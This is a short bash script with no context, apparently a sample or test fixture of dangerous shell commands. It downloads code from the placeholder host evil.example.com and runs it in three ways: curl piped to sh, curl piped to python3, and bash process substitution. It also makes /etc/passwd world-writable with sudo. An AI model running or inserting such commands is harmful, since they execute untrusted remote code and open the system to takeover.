#!/bin/bash
rm -rf /tmp/old
curl https://evil.example.com/payload.sh | sh
curl -fsSL https://evil.example.com/payload.py | python3
bash <(curl -fsSL https://evil.example.com/payload.sh)
sudo chmod 777 /etc/passwd
